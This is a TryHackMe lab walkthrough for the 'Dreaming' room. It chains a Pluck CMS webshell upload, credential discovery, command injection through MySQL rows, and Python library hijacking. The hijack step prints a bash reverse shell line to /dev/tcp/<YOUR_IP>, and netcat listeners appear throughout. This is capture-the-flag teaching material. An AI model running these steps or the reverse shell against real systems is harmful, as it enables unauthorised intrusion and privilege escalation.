# Dreaming - TryHackMe Walkthrough

> **Room:** Dreaming  
> **Platform:** TryHackMe  
> **Difficulty:** Medium *(As classified on TryHackMe)*

---

## 📖 Overview

In this room, we exploit an outdated **Pluck CMS** installation to gain Remote Code Execution (RCE), pivot through multiple Linux users, exploit a **command injection vulnerability**, abuse **MySQL database access**, and finally escalate privileges by abusing a **writable Python library** to obtain the final user.

---

## Skills Learned

- Network Enumeration
- Web Directory Enumeration
- CMS Version Enumeration
- Exploiting Pluck CMS RCE
- Reverse Shell
- Linux Privilege Escalation
- SSH Pivoting
- MySQL Enumeration
- Command Injection
- Python Library Hijacking
- Multi-stage Privilege Escalation

---

# Reconnaissance

## Nmap Scan

```bash
sudo nmap -sVC <TARGET_IP>
```

### Results

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The target exposes:

- SSH (22)
- Apache Web Server (80)

---

# Web Enumeration

Visiting the web server only shows the default Apache page.

Next, perform directory brute-forcing.

```bash
ffuf \
-u http://TARGET_IP/FUZZ \
-w /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

Interesting discovery:

```
/app
```

Browsing to `/app` reveals a **Pluck CMS** installation.

---

# Identifying the Vulnerability

After identifying the CMS version, search for public vulnerabilities.

An authenticated **File Upload → Remote Code Execution** exploit exists for the installed version of Pluck CMS.

The admin login page accepts the weak password:

```
password
```

After authentication, the exploit can be executed.

---

# Exploiting Pluck CMS

The exploit requires:

```python
target_ip
target_port
password
pluckcmspath
```

Execution:

```bash
python3 rce_script.py 10.49.152.119 80 password /app/pluck-4.7.13
```

Output:

```
Authentication was successful
Uploading webshell...
```

The exploit uploads a PHP webshell.

Browse to:

```
http://TARGET_IP/app/pluck-4.7.13/files/shell.phar
```

The webshell provides remote command execution.

---

# Initial Foothold

Start a listener:

```bash
sudo nc -lvnp 8080
```

Trigger the reverse shell from the webshell.

Connection received:

```bash
www-data
```

Current user:

```
www-data
```

---

# Enumerating the System

Inside `/opt`:

```bash
ls -la /opt
```

Interesting files:

```
getDreams.py
test.py
```

Reading `test.py` reveals credentials belonging to **lucien**.

SSH into the machine:

```bash
ssh lucien@TARGET_IP
```

Successfully logged in as:

```
lucien
```

Retrieve the first flag.

---

# Privilege Escalation (Lucien → Death)

Check sudo permissions:

```bash
sudo -l
```

Output:

```
(death) NOPASSWD:
/usr/bin/python3 /home/death/getDreams.py
```

Inspect the Python script.

One important line is:

```python
command = f"echo {dreamer} + {dream}"
shell=True
```

Since user-controlled database values are executed inside a shell command, this introduces a **command injection vulnerability**.

---

# Enumerating MySQL

Checking shell history:

```bash
cat ~/.bash_history
```

A MySQL password is discovered.

Login:

```bash
mysql -u lucien -p
```

Select the database:

```sql
USE library;
```

List tables:

```sql
SHOW TABLES;
```

Result:

```
dreams
```

Inspecting the application source revealed that every row inside this table is echoed through:

```python
subprocess.check_output(..., shell=True)
```

This means anything inserted into the **dream** column will eventually be executed.

Insert a payload:

```sql
INSERT INTO dreams (dreamer,dream)
VALUES (
'NoBody',
'$(reverse shell payload)'
);
```

Exit MySQL.

---

# Triggering Command Injection

Start a listener:

```bash
sudo nc -lvnp 4444
```

Execute:

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

The malicious database entry executes automatically.

Reverse shell received.

Current user:

```
death
```

Retrieve the second flag.

---

# Privilege Escalation (Death → Morpheus)

Searching for writable files:

```bash
find / \
-type f \
-not -path "/proc/*" \
-not -path "/sys/*" \
-not -path "/home/death/*" \
-writable 2>/dev/null
```

A writable Python library is discovered.

One of the privileged scripts imports:

```
shutil
```

Since **Death** can overwrite this module, Python will execute our malicious code the next time it is imported.

Overwrite the library:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1'")
```

Save it as:

```
/usr/lib/python3.8/shutil.py
```

Start another listener.

Eventually the privileged script imports `shutil`, executing our payload.

A reverse shell is received as:

```
morpheus
```

Retrieve the final flag.

---

# Attack Chain

```
Nmap Scan
      │
      ▼
Apache Default Page
      │
      ▼
Directory Enumeration
      │
      ▼
Pluck CMS
      │
      ▼
Authenticated File Upload RCE
      │
      ▼
www-data
      │
      ▼
Credential Discovery
      │
      ▼
SSH → lucien
      │
      ▼
sudo -l
      │
      ▼
getDreams.py
      │
      ▼
Command Injection
      │
      ▼
death
      │
      ▼
Writable Python Library
      │
      ▼
Python Library Hijacking
      │
      ▼
morpheus
```

---

# Tools Used

- Nmap
- FFUF
- Netcat
- SSH
- MySQL Client
- Python
- Linux Utilities

---

# Key Takeaways

- Always enumerate hidden directories.
- Weak credentials can completely compromise a CMS.
- Public exploits should always be validated against identified software versions.
- Never use `shell=True` with untrusted input.
- Database entries should never be directly passed into shell commands.
- Writable Python libraries can lead to full privilege escalation.
- Thorough enumeration after every privilege escalation often reveals the next attack path.

---

## Learning Outcomes

This room demonstrates a realistic multi-stage Linux compromise involving:

- Web exploitation
- Credential harvesting
- Lateral movement
- Database abuse
- Command injection
- Python library hijacking
- Linux privilege escalation

It is an excellent room for practicing complete attack chains rather than isolated vulnerabilities.

---

## Disclaimer

This walkthrough was created for educational purposes while solving the **Dreaming** room on **TryHackMe**. All activities were performed in a legal lab environment.
